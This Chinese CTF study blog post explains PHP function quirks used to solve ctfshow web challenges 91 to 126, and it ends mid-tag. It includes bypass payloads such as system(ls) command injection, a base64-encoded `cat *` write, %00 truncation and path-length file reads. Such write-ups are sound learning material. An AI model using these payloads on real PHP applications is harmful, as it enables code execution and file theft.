{"title":"php特性","uid":"cd1787040df7226f24b8f728e6089b8f","slug":"php特性","date":"2024-11-12T13:38:25.000Z","updated":"2024-11-12T13:39:14.086Z","comments":true,"path":"api/articles/php特性.json","keywords":null,"cover":"/image/7.jpg","content":"<h1 id=\"php特性\"><a href=\"#php特性\" class=\"headerlink\" title=\"php特性\"></a><strong>php</strong>特性</h1><h2 id=\"1-intval\"><a href=\"#1-intval\" class=\"headerlink\" title=\"1.intval\"></a><strong>1.intval</strong></h2><p> <img src=\"/post/php%E7%89%B9%E6%80%A7/%E5%9B%BE%E7%89%871.png\" alt=\"图片1\"></p>\n<p>也就是说传入是<strong>数组</strong>时，<strong>返回值为1</strong> (弱比较)</p>\n<p>此函数会将 + 空格来进行<strong>跳过判断</strong></p>\n<img src=\"/post/php%E7%89%B9%E6%80%A7/图片2.png\" alt=\"图片2\" style=\"zoom:150%;\">\n\n<p>当base&#x3D;0时，<strong>进制可以自定义</strong></p>\n<h3 id=\"Web92\"><a href=\"#Web92\" class=\"headerlink\" title=\"Web92\"></a><strong>Web92</strong></h3><p>传入其他进制形式的4476即可</p>\n<h3 id=\"Web93\"><a href=\"#Web93\" class=\"headerlink\" title=\"Web93\"></a><strong>Web93</strong></h3><p>Eg:八进制010574  16进制 0x117c</p>\n<p>因为返回值是整数 (也就是只检查整数)</p>\n<p>所以传入值为<strong>4476.1</strong>也行</p>\n<h2 id=\"2-preg-match\"><a href=\"#2-preg-match\" class=\"headerlink\" title=\"2.preg_match\"></a><strong>2.preg_match</strong></h2><p>​    <strong>m</strong>—表示<strong>多行匹配，</strong>默认只<strong>匹配一行</strong>（第一行）</p>\n<h3 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a><strong>web91</strong></h3><p>利用该特性绕过<strong>第一行的正则匹配</strong></p>\n<p>​    payload:<strong>%a0php</strong></p>\n<p> web131</p>\n<p>利用栈溢出 （长度绕过）</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240515203539668.png\" alt=\"image-20240515203539668\"></p>\n<p>请求即可</p>\n<h2 id=\"3-strops\"><a href=\"#3-strops\" class=\"headerlink\" title=\"3.strops\"></a><strong>3.strops</strong></h2><hr>\n<p>​    检测指定<strong>字符第一次出现的位置，</strong>出现即阻断，返回false</p>\n <img src=\"/post/php%E7%89%B9%E6%80%A7/图片3.png\" alt=\"图片3\" style=\"zoom:150%;\">\n\n<h2 id=\"4-php三目运算符\"><a href=\"#4-php三目运算符\" class=\"headerlink\" title=\"4.php三目运算符\"></a><strong>4.php三目运算符</strong></h2><p>Web98 自行理解</p>\n<h2 id=\"5-in-array\"><a href=\"#5-in-array\" class=\"headerlink\" title=\"5.in_array\"></a><strong>5.in_array</strong></h2><p>​    <strong>搜索数组</strong>中是否有<strong>指定值</strong></p>\n<p>​    in_array(a,b) <strong>在b中寻找是否有a</strong></p>\n<h2 id=\"6-is-numeric\"><a href=\"#6-is-numeric\" class=\"headerlink\" title=\"6.is_numeric\"></a><strong>6.is_numeric</strong></h2><p>​    用于检查一个变量是否是一个数字或者数字字符串</p>\n<p>$var1 &#x3D; 123;</p>\n<p>$var2 &#x3D; “456”;</p>\n<p>$var3 &#x3D; “abc”;</p>\n<p>var_dump(is_numeric($var1)); &#x2F;&#x2F; 输出: bool(true)</p>\n<p>var_dump(is_numeric($var2)); &#x2F;&#x2F; 输出: bool(true)</p>\n<p>var_dump(is_numeric($var3)); &#x2F;&#x2F; 输出: bool(false)</p>\n<h2 id=\"7-and与-的区别-（优先级）-反射类ReflectionClass的使用\"><a href=\"#7-and与-的区别-（优先级）-反射类ReflectionClass的使用\" class=\"headerlink\" title=\"7. and与&amp;&amp;的区别 （优先级）+反射类ReflectionClass的使用\"></a><strong>7.</strong> <strong>and</strong>与&amp;&amp;的区别 （优先级）+反射类ReflectionClass的使用</h2><h3 id=\"Web100\"><a href=\"#Web100\" class=\"headerlink\" title=\"Web100\"></a>Web100</h3><p>​    <strong>&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or</strong></p>\n<p>​    逻辑运算符 <code>**and**</code> 优先级比 <code>**=**</code> <strong>更低</strong></p>\n<p>​    $v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</p>\n<p>​    所以<strong>只要v1是数字</strong> is_numeric()返回值为1  <strong>v0</strong>就为1</p>\n<p>​    V2直接闭合即可</p>\n<p><em>&lt;?php</em></p>\n<p><em>$a&#x3D;true and false and false;</em></p>\n<p>var_dump($a); <strong>返回true</strong></p>\n<p><em>$a&#x3D;true &amp;&amp; false &amp;&amp; false;</em></p>\n<p>var_dump($a); <strong>返回false</strong></p>\n<p>​    <code>eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);</code></p>\n<p>l v2为执行的命令，v3要为<strong>分号与</strong>(‘ctfshow’)结合起来&#96;进行闭合</p>\n<p><code>l </code>v2&#x3D;echo new <strong>ReflectionClass</strong>&amp;v3&#x3D;; </p>\n<p><strong>ReflectionClass</strong>它可以与<strong>已定义的类</strong>建立映射关系，通过<strong>反射类</strong>可以<strong>对类操作</strong></p>\n<h3 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h3><p>&amp;&amp;的优先级高于||所以在</p>\n<p><code>if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</code></p>\n<p>中，<strong>先运行&amp;&amp;再会运行||，</strong></p>\n<p>当对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； </p>\n<p>对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y</p>\n<p>eg:</p>\n<p><code>&lt;?php</code>   </p>\n<p>  <code>$test=&quot;李四&quot;;</code>   </p>\n<p>  <code>$test==&quot;张三&quot;&amp;&amp;$test=&quot;张三来了&quot;;</code>   </p>\n<p>  <code>echo $test; //输出“李四”</code>   </p>\n<p>  <code>$test=&quot;李四&quot;;</code>   </p>\n<p>  <code>$test==&quot;张三&quot;||$test=&quot;张三不在这里&quot;;</code>   </p>\n<p>  <code>echo $test; //输出“张三不在这里”</code>   </p>\n<p><code>?&gt;</code></p>\n<p>第一部分  $code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag  <strong>$code&#x3D;admin 返回（false）即可</strong></p>\n<p>第二部分  $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;”admin”             <strong>$password&#x3D;1  返回（false）即可</strong></p>\n<p>最终payload:</p>\n<p>GET: <strong>?code&#x3D;admin&amp;password&#x3D;1&amp;username&#x3D;admin</strong></p>\n<h2 id=\"hex2bin转换\"><a href=\"#hex2bin转换\" class=\"headerlink\" title=\"hex2bin转换\"></a>hex2bin转换</h2><p><strong>8.web102</strong></p>\n<p>115044383959474e6864434171594473 该字符串16进制转字符串 利用hex2bin转换之后为 <img src=\"/post/php%E7%89%B9%E6%80%A7/%E5%9B%BE%E7%89%874.png\" alt=\"图片4\"><br>base64解密之后是 &lt;?&#x3D;<code>cat  *</code>;<br>php:&#x2F;&#x2F;filter&#x2F;<strong>write</strong>&#x3D;convert.base64-decode&#x2F;resource</p>\n<p>回显的是命令执行后的结果</p>\n<p>php:&#x2F;&#x2F;filter&#x2F;<strong>read</strong>&#x3D;convert.base64-decode&#x2F;resource</p>\n<p>回显的是文件内容base64编码后的格式</p>\n<h2 id=\"9-ctype-alpha\"><a href=\"#9-ctype-alpha\" class=\"headerlink\" title=\"9.ctype_alpha\"></a>9.ctype_alpha</h2><p>(<a href=\"https://www.php.net/manual/zh/language.types.mixed.php\">mixed</a> $text): <a href=\"https://www.php.net/manual/zh/language.types.boolean.php\">bool</a> <a href=\"https://www.php.net/manual/zh/language.types.string.php\">string</a> 类型的 <code>text</code> 里面的所有字符是否都是字母<code>[A-Za-z]</code>。</p>\n<p>如果在当前区域设置中 text 里的每个字符都是字母，那么就返回 true，否则返回 false。当使用空字符串调用时，结果始终为 false。</p>\n<h2 id=\"10-变量覆盖\"><a href=\"#10-变量覆盖\" class=\"headerlink\" title=\"10.变量覆盖\"></a>10.变量覆盖</h2><h3 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h3><p><code>$$key=$$value</code> </p>\n<p>如果$key是”name”，那么**$$key就等于$name**</p>\n<p><code>die($suces)</code></p>\n<p>输出 <code>$suces</code> 变量的值，然后终止脚本的执行。</p>\n<p><em>post中value不能等于flag</em></p>\n<p><em>get中key不能等于error</em></p>\n<p>思路一</p>\n<p>通过die($error);</p>\n<p>GET:suces&#x3D;flag</p>\n<p>POST:error&#x3D;suces</p>\n<p>或者引入第三个变量</p>\n<p>GET:x&#x3D;flag</p>\n<p>POST:error&#x3D;x</p>\n<p>思路二</p>\n<p>通过die($suces)</p>\n<p>?suces&#x3D;flag&amp;flag&#x3D;1</p>\n<h2 id=\"11-parse-str\"><a href=\"#11-parse-str\" class=\"headerlink\" title=\"11.parse_str\"></a>11.parse_str</h2><p>将字符串解析成多个变量</p>\n<p>设置了第二个变量 result, 变量将会以<strong>数组元素</strong>的形式存入到<strong>这个数组</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"string\">&quot;first=value&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$str</span>, <span class=\"variable\">$output</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>[<span class=\"string\">&#x27;first&#x27;</span>];</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$v1</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;v1&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$v3</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v3&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$v1</span>,<span class=\"variable\">$v2</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$v2</span>[<span class=\"string\">&#x27;flag&#x27;</span>]==<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$v3</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>此时v2是v1数组中的元素，同时v2也是一个数组</p>\n<p>$v2[‘flag’]就是<strong>v2数组中键值为flag</strong>的元素</p>\n<p>思路一</p>\n<p>传入特殊值进行绕过</p>\n<p>GET:v3&#x3D;<strong>240610708</strong>    md5加密之后为0e字符串 返回0</p>\n<p>POST:v1&#x3D;flag&#x3D;0</p>\n<p>思路二</p>\n<p>让v1值为<strong>v3md5加密值</strong>即可</p>\n<p>GET:v3&#x3D;aa</p>\n<p>POST:v1&#x3D;flag&#x3D;4124bc0a9335c27f086f24ba207a4912</p>\n<h2 id=\"12-strrev-ereg\"><a href=\"#12-strrev-ereg\" class=\"headerlink\" title=\"12.strrev+ereg\"></a>12.strrev+ereg</h2><p> strrev反转字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">strrev</span>(<span class=\"string\">&quot;Hello world!&quot;</span>); <span class=\"comment\">// 输出 &quot;!dlrow olleH&quot;?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ereg (&quot;^[a-zA-Z]+$&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>正则表达式中^是开始位置，$是结束位置，+表示匹配前面的子表达式一次或多次</p>\n<p>ereg函数存在%00截断漏洞</p>\n<p>思路</p>\n<p>传入字母之后用%00截断</p>\n<p>再传入倒叙数字</p>\n<p>payload:<strong>?c&#x3D;a%00778</strong></p>\n<h2 id=\"13-PHP异常处理-Exception\"><a href=\"#13-PHP异常处理-Exception\" class=\"headerlink\" title=\"13.PHP异常处理 Exception\"></a>13.PHP<a href=\"https://so.csdn.net/so/search?q=%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020\">异常处理</a> Exception</h2><p>经过实验发现如果类中存在**__toString**的魔术方法</p>\n<p>则给什么值就返回什么值</p>\n<p>eg <img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421150226620.png\" alt=\"image-20240421150226620\" style=\"zoom:67%;\"></p>\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421150243148.png\" alt=\"image-20240421150243148\" style=\"zoom: 50%;\">\n\n<p>所以可以进行<strong>命令执行</strong></p>\n<p>经查询之后发现<strong>Exception</strong>类可以实现（php内置类）</p>\n<p>![屏幕截图 2024-04-21 145659](php特性&#x2F;屏幕截图 2024-04-21 145659.png)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;    </span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Exception</span>(<span class=\"string\">&quot;Some error message&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;    </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$e</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421151500240.png\" alt=\"image-20240421151500240\" style=\"zoom: 67%;\">\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$reflectionClass</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">ReflectionClass</span>(<span class=\"string\">&#x27;Exception&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$reflectionClass</span>-&gt;<span class=\"title function_ invoke__\">__toString</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h3><p>payload:</p>\n<p>v1&#x3D;exception&amp;v2&#x3D;system(ls)</p>\n<p>上边提到的反射性也可以 用法完全相同</p>\n<p>v1&#x3D;Reflectionclass&amp;v2&#x3D;system(ls)</p>\n<h2 id=\"PHP原生类总结\"><a href=\"#PHP原生类总结\" class=\"headerlink\" title=\"PHP原生类总结\"></a>PHP原生类总结</h2><p><a href=\"https://xz.aliyun.com/t/13785?time__1311=GqmxuQi=e7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\">https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0</a></p>\n<h2 id=\"14-FilesystemIterator\"><a href=\"#14-FilesystemIterator\" class=\"headerlink\" title=\"14.FilesystemIterator\"></a>14.FilesystemIterator</h2><p>（php内置类）<strong>遍历文件</strong></p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421152453807.png\" alt=\"image-20240421152453807\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">SplFileInfo</span>(<span class=\"string\">&#x27;foo&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$info</span>-&gt;<span class=\"title function_ invoke__\">__toString</span>());</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$info</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">SplFileInfo</span>(<span class=\"string\">&#x27;/usr/bin/php&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$info</span>-&gt;<span class=\"title function_ invoke__\">__toString</span>());</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$info</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以上示例的输出类似于：</span><br><span class=\"line\">string(3) &quot;foo&quot;</span><br><span class=\"line\">foo</span><br><span class=\"line\">string(12) &quot;/usr/bin/php&quot;</span><br><span class=\"line\">/usr/bin/php</span><br></pre></td></tr></table></figure>\n\n<p>可以结合<strong>Obj</strong>来读取当前目录</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421152945188.png\" alt=\"image-20240421152945188\"></p>\n<p>返回第一个文件名</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421154019368.png\" alt=\"image-20240421154019368\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$dir</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">DirectoryIterator</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>));</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$dir</span> <span class=\"keyword\">as</span> <span class=\"variable\">$fileinfo</span>) &#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$fileinfo</span>;&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>遍历目录</strong></p>\n<h3 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h3><p>payload:<br>v1&#x3D;filesystemIterator&amp;v2&#x3D;getcwd</p>\n<h2 id=\"15-GLOBAL\"><a href=\"#15-GLOBAL\" class=\"headerlink\" title=\"15.GLOBAL\"></a>15.GLOBAL</h2><p>全局变量</p>\n<p>web111</p>\n<h2 id=\"16-is-file\"><a href=\"#16-is-file\" class=\"headerlink\" title=\"16.is_file\"></a>16.is_file</h2><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421155859820.png\" alt=\"image-20240421155859820\" style=\"zoom:67%;\">\n\n<p>如果文件存在且为正常的文件则返回 **<code>true</code>**，否则返回 **<code>false</code>**。  </p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421155957220.png\" alt=\"image-20240421155957220\"></p>\n<p>可见<strong>支持伪协议的的封装</strong></p>\n<p>正常直接传入一个存在的文件会<strong>返回true</strong></p>\n<p>用伪协议<strong>封装一个存在的文件</strong>会<strong>返回false</strong> </p>\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421160244190.png\" alt=\"image-20240421160244190\" style=\"zoom: 67%;\">\n\n<h2 id=\"17-compress-zlib\"><a href=\"#17-compress-zlib\" class=\"headerlink\" title=\"17.compress.zlib:&#x2F;&#x2F;\"></a>17.compress.zlib:&#x2F;&#x2F;</h2><h3 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h3><p><strong>思路一</strong></p>\n<p>发现过滤filter</p>\n<p>换取其他没有过滤的流即可</p>\n<p>compress.zlib:&#x2F;&#x2F;</p>\n<p><strong>思路二</strong></p>\n<p>进行目录溢出 （长度绕过）</p>\n<p>&#x2F;proc&#x2F;self&#x2F;root代表根目录</p>\n<p>超过is_file能处理的最大长度就不认为是个文件</p>\n<p>payload:</p>\n<p>file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F; self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<h2 id=\"18-num-36-and-num-36-和-trim绕过\"><a href=\"#18-num-36-and-num-36-和-trim绕过\" class=\"headerlink\" title=\"18.num!&#x3D;&#x3D;36 and num&#x3D;&#x3D;36 和 trim绕过\"></a>18.num!&#x3D;&#x3D;36 and num&#x3D;&#x3D;36 和 trim绕过</h2><h3 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h3><p>先来看官方文档中对于这两个比较运算符的解释</p>\n<table>\n<thead>\n<tr>\n<th>$a &#x3D;&#x3D; $b</th>\n<th>等于</th>\n<th>**<code>true</code>**，如果类型转换后 $a 等于 $b。</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$a !&#x3D;&#x3D; $b</td>\n<td>不全等</td>\n<td>**<code>true</code>**，如果 $a 不等于 $b，或者它们的类型不同。</td>\n</tr>\n</tbody></table>\n<p>当两个操作对象都是  <a href=\"https://www.php.net/manual/zh/language.types.numeric-strings.php\">数字字符串</a>，  或一个是<strong>数字</strong>另一个是  <a href=\"https://www.php.net/manual/zh/language.types.numeric-strings.php\">数字字符串</a>，  就会自动按照数值进行比较。  此规则也适用于  <a href=\"https://www.php.net/manual/zh/control-structures.switch.php\">switch</a> 语句。  当比较时用的是 <code>===</code> 或 <code>!==</code>，  则不会进行类型转换——因为不仅要对比数值，还要对比类型。 </p>\n<p><code>var_dump(intval($num));</code></p>\n<p><strong>$num&#x3D;%0c36</strong>时强制转换后值为<strong>36</strong></p>\n<p>为什么要传**%0c**</p>\n<p><strong>%0c</strong>在ascii表中代表换页符</p>\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240421164816160.png\" alt=\"image-20240421164816160\" style=\"zoom: 80%;\">\n\n<p>并且<strong>trim中</strong>去除的字符<strong>不包含%0c</strong> 可以绕过</p>\n<p>通过文档已知**&#x3D;&#x3D;<strong>在做</strong>比较时<strong>会对</strong>字符串进行转换<strong>成</strong>数值后再进行比较** 这里的转换过程类似 <strong>intval()</strong></p>\n<p><strong>%0c36</strong>在这个<strong>转换过程中</strong>也会转换成<strong>数值36</strong></p>\n<p>所以</p>\n<p><strong>num&#x3D;%0c36 num&#x3D;&#x3D;36 为真</strong></p>\n<p>!&#x3D;&#x3D;属于强比较类型</p>\n<p>会比较数值的同时比较类型</p>\n<p>%0c36明显是个字符串类型  36是整形</p>\n<p>所以</p>\n<p><strong>num&#x3D;%0c36 num！&#x3D;&#x3D;36 为真</strong></p>\n<p>两个判断同时绕过</p>\n<h2 id=\"19-php-get或post变量名中非法字符转化规则\"><a href=\"#19-php-get或post变量名中非法字符转化规则\" class=\"headerlink\" title=\"19.php get或post变量名中非法字符转化规则\"></a>19.php get或post变量名中非法字符转化规则</h2><p><a href=\"https://so.csdn.net/so/search?q=get&spm=1001.2101.3001.7020\">get</a>或者post传入的变量名含有  <strong>空格、+、.、[</strong>  则会被转化为</p>\n<p>eg:</p>\n<p>diao_s.i &#x3D;&#x3D;》diao_s_i</p>\n<p>也就是PHP网页用diao_s_i可以正常接收diao_s.i传递过来的值，中间会有个<a href=\"https://so.csdn.net/so/search?q=%E8%87%AA%E5%8A%A8%E8%BD%AC%E6%8D%A2&spm=1001.2101.3001.7020\">自动转换</a>的过程</p>\n<p>如果传入**[<strong>，它被</strong>转化为_之后**，后面的字符就会被保留下来不会被替换。</p>\n<p>eg:</p>\n<p>diao[s.i &#x3D;&#x3D;&gt; diao_s.i，利上面的[经过一次转换后可以正常接收</p>\n<h3 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h3><p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425153029032.png\" alt=\"image-20240425153029032\"></p>\n<p>如果让if判断为真，就必须传入CTF_SHOW.COM</p>\n<p>我们已知  <strong>.</strong>  是非法变量名，但要保留  <strong>.</strong>   就需要把  _  换成  <strong>[</strong>  即可</p>\n<p><strong>思路一</strong></p>\n<p>payload:</p>\n<p>CTF_SHOW&#x3D;1&amp;<strong>CTF[SHOW.COM</strong>&#x3D;2&amp;fun&#x3D;echo $flag</p>\n<p><strong>思路二</strong></p>\n<p>利用php内置函数</p>\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425153516814.png\" alt=\"image-20240425153516814\" style=\"zoom:80%;\">\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$array</span> = [<span class=\"string\">&#x27;lastname&#x27;</span>, <span class=\"string\">&#x27;email&#x27;</span>, <span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&quot;,&quot;</span>, <span class=\"variable\">$array</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// string(20) &quot;lastname,email,phone&quot;</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425153707997.png\" alt=\"image-20240425153707997\" style=\"zoom:67%;\">\n\n<img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425153752369.png\" alt=\"image-20240425153752369\" style=\"zoom:67%;\">\n\n<p>拿文件名</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425154040512.png\" alt=\"image-20240425154040512\"></p>\n<p>拿已定义变量值</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240425154121663.png\" alt=\"image-20240425154121663\"></p>\n<p>可以多去了解<strong>get开头的php内置函数</strong></p>\n<h2 id=\"20-var-export和include-GET-1-和highlight-file-GET-1\"><a href=\"#20-var-export和include-GET-1-和highlight-file-GET-1\" class=\"headerlink\" title=\"20.var_export和include$_GET[1]和highlight_file($GET[1])\"></a>20.var_export和include$_GET[1]和highlight_file($GET[1])</h2><h3 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h3><p>$_GET[1]的用法</p>\n<p><code>$_GET[1]</code>：这会从 URL 查询参数中获取名为 <code>1</code> 的值，如果该字符串是有效的文件路径，然后在某种上下文中被执行，比如通过 <code>include</code> 或 <code>file_get_contents</code> 等函数，那么它会将该文件的内容作为字符串返回。</p>\n<p>PS:file_get_contents无法使用原因</p>\n<p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514182305688.png\" alt=\"image-20240514182305688\"></p>\n<h2 id=\"21-parse-str-及-SERVER-argv-的利用\"><a href=\"#21-parse-str-及-SERVER-argv-的利用\" class=\"headerlink\" title=\"21.parse_str()及$_SERVER[argv]的利用\"></a>21.parse_str()及$_SERVER[argv]的利用</h2><h3 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h3><p><img src=\"/post/php%E7%89%B9%E6%80%A7/image-20240514183501813.png\" 